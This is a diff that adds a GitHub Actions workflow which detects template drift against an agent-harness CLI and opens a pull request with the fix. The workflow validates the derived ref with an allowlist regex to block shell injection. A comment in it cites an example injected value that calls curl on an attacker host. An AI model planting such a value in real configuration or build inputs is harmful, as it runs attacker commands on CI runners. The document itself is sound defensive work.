@@ -1,0 +1,110 @@
+# harness-drift.yml — scheduled drift detection per CS12 / LRN-074.
+#
+# Runs weekly. Calls `harness sync --mode=check` against this repo. If drift
+# is detected (exit 1), runs `sync --mode=apply` to generate the update,
+# then opens a PR via peter-evans/create-pull-request. Skips PR on no drift.
+# Other exit codes fail the workflow loudly (broken install / network /
+# harness crash MUST NOT silently produce drift PRs).
+
+name: harness-drift
+
+on:
+  schedule:
+    - cron: "0 6 * * 1"  # Monday 06:00 UTC
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  drift-check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
+      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0
+        with:
+          node-version: '20'
+      - id: derive-ref
+        name: Derive + validate harness CLI ref from harness.config.json
+        # CS12 R2 (gate fix): self-host fallback to ${{ github.sha }} when
+        # version is empty/`0.0.0-pre` AND repo is henrik-me/agent-harness.
+        # Other repos with unresolvable version fail loudly.
+        # CS12 R1 (PR #48 review): pass GitHub expressions through env: AND
+        # validate the derived ref against an allowlist regex BEFORE exporting
+        # as a step output. Direct interpolation into a `run:` shell would
+        # allow shell-injection (e.g. version=$(curl evil.com)).
+        env:
+          GH_REPO: ${{ github.repository }}
+          GH_SHA: ${{ github.sha }}
+        run: |
+          version=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
+          if [ -n "$version" ] && [ "$version" != "0.0.0-pre" ]; then
+            ref="$version"
+            echo "Using harness.config.json version ref: $ref"
+          elif [ "$GH_REPO" = "henrik-me/agent-harness" ]; then
+            ref="$GH_SHA"
+            echo "Using github.sha self-host fallback: $ref"
+          else
+            echo "ERROR: harness.config.json version is empty or '0.0.0-pre' but this is not the henrik-me/agent-harness repo." >&2
+            echo "ERROR: Pin a real semver tag (e.g. 'v0.2.0'), branch name, or 40-char SHA in harness.config.json 'version'." >&2
+            exit 1
+          fi
+          # Allowlist: alphanumeric, dot, underscore, slash, hyphen.
+          # Covers semver tags, branch names, and 40-char SHAs. Rejects shell
+          # metacharacters ($ ` " ' ; & | < > whitespace, etc.).
+          if ! printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'; then
+            echo "ERROR: ref \"$ref\" contains characters outside the allowlist [a-zA-Z0-9._/-]." >&2
+            echo "ERROR: Refusing to interpolate into shell — see CS12 R1 PR review for shell-injection rationale." >&2
+            exit 1
+          fi
+          echo "ref=$ref" >> "$GITHUB_OUTPUT"
+      - id: check-drift
+        name: Check for drift
+        # Capture exit code explicitly. set +e so the script can branch on rc.
+        # Pass validated ref via env: (R1 PR review fix).
+        env:
+          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
+        run: |
+          set +e
+          npx -y "github:henrik-me/agent-harness#${CLI_REF}" sync --mode=check --cwd .
+          rc=$?
+          set -e
+          if [ "$rc" -eq 0 ]; then
+            echo "No drift detected."
+            echo "drift_detected=false" >> "$GITHUB_OUTPUT"
+          elif [ "$rc" -eq 1 ]; then
+            echo "Drift detected."
+            echo "drift_detected=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "ERROR: harness sync exited with unexpected code $rc (not 0=no-drift, 1=drift)" >&2
+            exit "$rc"
+          fi
+      - name: Apply drift fix
+        if: steps.check-drift.outputs.drift_detected == 'true'
+        env:
+          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
+        run: npx -y "github:henrik-me/agent-harness#${CLI_REF}" sync --mode=apply --cwd .
+      - name: Open PR
+        if: steps.check-drift.outputs.drift_detected == 'true'
+        uses: peter-evans/create-pull-request@5f6978faf089d4d20b00c7766989d076bb2fc7f1  # v8.1.1 as of 2026-05-04
+        with:
+          token: "${{ secrets.GITHUB_TOKEN }}"
+          commit-message: "chore: harness drift fix"
+          title: "harness drift detected: apply auto-update"
+          body: |
+            The harness drift gate detected divergence between
+            `template/managed|composed/` (at ref `${{ steps.derive-ref.outputs.ref }}`)
+            and the root files in `ae`. This PR contains the
+            output of `harness sync --mode=apply --cwd .`.
+
+            Reviewer checklist:
+            - [ ] Confirm the changes are expected (matches the upstream
+              harness ref).
+            - [ ] Run `harness lint --quiet` locally to validate.
+
+            Cc: @henrik-me
+          branch: harness-drift-fix
+          delete-branch: true
+          assignees: "henrik-me"
+          reviewers: "henrik-me"
